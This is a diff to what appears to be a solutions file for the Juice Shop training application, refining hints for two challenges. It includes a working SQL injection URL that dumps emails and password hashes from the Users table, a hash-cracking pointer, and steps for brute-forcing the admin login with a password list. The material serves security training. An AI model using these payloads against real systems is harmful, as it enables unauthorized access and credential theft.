@@ -85,7 +85,7 @@ Proposed solution to challenges
 2. Hint - see if there is vulnerability in searching products
 3. in main.js we discover - /rest/products/search?q=
 4. Maybe try a SQL Injection?
-5. .... /search?q=qwert'))%20UNION%20SELECT%20id,email,password,'4','5','6','7','8','9'%20FROM%20Users--
+5. /rest/products/search?q=qwert'))%20UNION%20SELECT%20id,email,password,'4','5','6','7','8','9'%20FROM%20Users--
 6. Hint - https://crackstation.net
 
 </code>
@@ -150,9 +150,10 @@ Proposed solution to challenges
 1. Previous challenge (A01/A03) we noticed admin's e-mail : admin@juice-sh.op
 2. Search in main.js for anything login e.g. "/login"
 3. Notice in your browser tool - /rest/user/login
-4. Now you need a password list and something to bruteforce the password.
-5. e.g. Try many attempts  on -  /rest/user/login - with the payload {'email':'admin@juice-sh.op', 'password':'mytestpassword'}
-6. Passwords files are all over the internet - e.g.  https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/best1050.txt
+4. Login a user you create and notice the payload and api
+5. Now you need a password list and something to bruteforce the password.
+6. e.g. Try many attempts  on -  /rest/user/login - with the payload {'email':'admin@juice-sh.op', 'password':'mytestpassword'}
+7. Passwords files are all over the internet - e.g.  https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/best1050.txt
 
 </code>
 
